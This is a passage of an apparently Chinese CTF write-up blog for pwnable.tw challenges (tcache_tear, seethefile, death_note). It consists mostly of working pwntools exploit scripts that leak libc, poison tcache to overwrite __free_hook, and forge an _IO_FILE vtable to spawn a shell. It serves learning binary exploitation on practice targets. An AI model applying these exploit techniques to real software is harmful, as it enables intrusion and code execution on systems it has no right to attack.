io.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size, data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Data:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">global</span> io</span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10207</span>)</span><br><span class="line">    <span class="comment">#io = process(&#x27;./tcache_tear&#x27;)</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./tcache_tear&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    name(p64(<span class="number">0</span>)+p64(<span class="number">0xa0</span>))</span><br><span class="line">    alloc(<span class="number">0xf0</span>, <span class="string">b&#x27;AAAA&#x27;</span>)                    <span class="comment">#填充一个chunk，后续用来爆破stdout</span></span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0xe0</span>, <span class="string">b&#x27;AAAA&#x27;</span>)                    <span class="comment">#用来爆破tcache_struct</span></span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0xe0</span>, <span class="string">b&#x27;\x10\x00&#x27;</span>)                <span class="comment">#到tcache_struct数据位置</span></span><br><span class="line">    alloc(<span class="number">0xe0</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">14</span>+<span class="string">b&#x27;\x07&#x27;</span>)         <span class="comment">#填充0x100到7个</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>)                       <span class="comment">#free两次进入unsorted bin</span></span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x20</span>, <span class="string">b&#x27;\x60\xc7&#x27;</span>)                <span class="comment">#爆破stdout</span></span><br><span class="line">    alloc(<span class="number">0xf0</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">0xf0</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#修改IO</span></span><br><span class="line">    </span><br><span class="line">    io.recv(<span class="number">8</span>)</span><br><span class="line">    libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ed8b0</span></span><br><span class="line">    log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">    __free_hook = libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    sys = libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)                       <span class="comment">#tcache poison打__free_hook</span></span><br><span class="line">    free()</span><br><span class="line">    free()</span><br><span class="line">    alloc(<span class="number">0x50</span>, p64(__free_hook))</span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    alloc(<span class="number">0x50</span>, p64(sys))</span><br><span class="line">    alloc(<span class="number">0x50</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    free()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#DEBUG()</span></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pwn()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> error:</span><br><span class="line">            <span class="built_in">print</span>(error)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h3 id="打法2—bss段伪造堆块泄露libc"><a href="#打法2—bss段伪造堆块泄露libc" class="headerlink" title="打法2—bss段伪造堆块泄露libc"></a>打法2—bss段伪造堆块泄露libc</h3><p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bss段伪造堆块泄露libc</span></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10207</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./tcache_tear&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./tcache_tear&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>(<span class="params">data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size, data</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size:&#x27;</span>)</span><br><span class="line">    io.send(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Data:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>():</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#在bss段伪造堆结构，使libc地址恰好落入name位置</span></span><br><span class="line">name_add = <span class="number">0x602060</span></span><br><span class="line">name(p64(<span class="number">0</span>)+p64(<span class="number">0x511</span>))</span><br><span class="line">alloc(<span class="number">0x90</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x90</span>, p64(name_add+<span class="number">0x510</span>))</span><br><span class="line">alloc(<span class="number">0x90</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x90</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x80</span>, p64(name_add+<span class="number">0x10</span>))</span><br><span class="line">alloc(<span class="number">0x80</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>, p64(<span class="number">0</span>))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">info()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Name :&#x27;</span>)</span><br><span class="line">io.recv(<span class="number">0x10</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">__free_hook = libcbase+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys = libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">alloc(<span class="number">0x50</span>, p64(__free_hook))</span><br><span class="line">alloc(<span class="number">0x50</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0x50</span>, p64(sys))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x0b-seethefile"><a href="#0x0b-seethefile" class="headerlink" title="0x0b. seethefile"></a>0x0b. seethefile</h2><p><code>checksec</code>看到只开了NX，然后IDA打开可以看到是一个打开读取文件的程序，禁止打开含有flag子串的文件</p>
<p><code>main</code>函数如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">32</span>]; <span class="comment">// [esp+Ch] [ebp-2Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init();</span><br><span class="line">  welcome();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, nptr);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(nptr) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        openfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        readfile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        writefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        closefile();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line">        <span class="keyword">if</span> ( fp )</span><br><span class="line">          fclose(fp);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invaild choice&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到有两个<code>scanf(&quot;%s&quot;)</code>，但是第一个无法控制栈，因为main函数直接调用exit(0)退出，而不是正常return</p>
<p>第二个对应的缓冲区位于bss段上，可以溢出覆盖fp指针，然后通过<code>fclose(fp)</code>打IO</p>
<blockquote>
<p><strong>关于fclose(fp)如何打IO：</strong></p>
<p>如果我们在平时写代码的时候注意观察，就会发现fp指针指向一个_IO_FILE结构，fclose函数便与这个结构体息息相关</p>
<p>有关_IO_FILE结构的知识不在这里赘述。首先我们需要观察fclose函数的源码(libc-2.23)</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line">  CHECK_FILE(fp, EOF);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span></span><br><span class="line">  <span class="comment">/* We desperately try to help programs which are using streams in a</span></span><br><span class="line"><span class="comment">     strange way and mix old and new functions.  Detect old streams</span></span><br><span class="line"><span class="comment">     here.  */</span></span><br><span class="line">  <span class="keyword">if</span> (_IO_vtable_offset (fp) != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> _IO_old_fclose (fp);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>其中_IO_FINISH函数位于vtable表中</strong>，这就意味着假如我们可以伪造_IO_FILE结构体，那么我们就可以修改vtable中对应位置的函数指针为任意地址</p>
<p>可以注意到，要执行到该函数指针，我们需要绕过前面两个判断，因此我们需要伪造flags对应<code>_IO_IS_FILEBUF</code>标志位为0，即<code>flags &amp; 0x2000 == 0</code>，因此我们可以伪造flags为<code>0xffffdfff</code>，然后直接伪造vtable表中_IO_FINISH位置为system</p>
<p>由于程序在执行该函数指针时会以_IO_FILE结构体的地址为第一个参数，因此我们需要在其+4位置写入<code>;sh\x00</code>，这样就会执行<code>system(0xffffdfff;sh\x00)</code></p>
</blockquote>
<p>知道了该如何利用之后，我们需要先泄露libc，在网上看师傅们的题解的时候看到可以通过读取<code>/proc/self/maps</code>文件来获取当前进程的内存空间。</p>
<blockquote>
<p><strong>&#x2F;proc&#x2F;self&#x2F;目录的意义</strong></p>
<p>我们都知道可以通过&#x2F;proc&#x2F;$pid&#x2F;来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问&#x2F;proc&#x2F;$pid&#x2F;目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的系统信息，而不用每次都获取pid。</p>
<p>from：<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/dillanzhou/article/details/82876575" >&#x2F;proc&#x2F;self&#x2F;目录的意义_dillanzhou的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<p>在获取的时候有一个坑，就是读取一次会露出来一个像libc基址的地址，实际上还需要再读一次才能看到真实的libc基址</p>
<p>同时，获得shell之后，题目为了避免别人通过奇怪的方式拿到flag，特意写了个程序来获取flag，具体如何获取，看一下get_flag.c就知道了</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10200</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./seethefile&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./seethefile&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DEBUG</span>():</span><br><span class="line">    attach(io, <span class="string">&#x27;b *0x8048af5&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">    io.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取/proc/self/maps文件泄露libc</span></span><br><span class="line">menu(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;What do you want to see :&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;/proc/self/maps\n&#x27;</span>)</span><br><span class="line">menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">menu(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">menu(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;00:00 0 \n&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(io.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libcbase ===&gt; &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="comment">#DEBUG()</span></span><br><span class="line">menu(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Leave your name :&#x27;</span>)</span><br><span class="line">fake_io_addr = <span class="number">0x804b290</span></span><br><span class="line">fake_io = p32(<span class="number">0xffffdfff</span>)+<span class="string">b&#x27;;sh\x00&#x27;</span></span><br><span class="line">fake_io = fake_io.ljust(<span class="number">0x94</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(fake_io_addr+<span class="number">0x98</span>)</span><br><span class="line">fake_io += <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span> + p32(libcbase+libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x20</span>+p32(fake_io_addr)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xc</span>+fake_io</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="0x0c-death-note"><a href="#0x0c-death-note" class="headerlink" title="0x0c. death_note"></a>0x0c. death_note</h2><p><code>checksec</code>看到只开了canary，NX都没开，应该是和shellcode有关系</p>
<p>然后看程序，是菜单题，分别有add，show，delete选项，并且在index输入中都存在下溢，因此可以直接覆写got表</p>
<p>大致看下程序之后基本就可以确定思路，直接覆写got表对应项，然后直接跳转到堆中写入的shellcode。本题的关键就在于shellcode该咋写</p>
<p>看<code>add_note()</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-60h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  v1 = read_int();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound !!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name :&quot;</span>);</span><br><span class="line">  read_input(s, <span class="number">0x50</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !is_printable(s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It must be a printable name !&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(&amp;note + v1) = strdup(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以发现只能输入可打印字符，并且最大长度为0x50，在本题中，我使用了<code>dec 寄存器 </code>，<code>inc 寄存器</code>，<code>xor [eax+偏移], cl</code>，<code>push 寄存器</code>，<code>pop 寄存器</code>操作。基本思路是首先申请一个堆块来存放<code>/bin/sh\x00</code>字符串，然后覆写free函数got表为shellcode地址，最后delete第一个堆块。shellcode编写时先观察进入shellcode时的寄存器状态，利用push，pop操作修改<code>ebx=&quot;/bin/sh\x00&quot;     ecx=0     edx=0</code>，然后利用dec xor操作将无法直接写入的<code>int 80</code>操作码<code>CD 80</code>经过异或得到<code>(33^FE=CD   7E^FE=80)</code>，最后利用inc操作修改eax为系统调用号0xb</p>
<p>有一点很坑，就是本机调试的时候堆空间没有执行权限，只有栈有，所以基本是靠感觉写出来的shellcode</p>
<p>exp:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 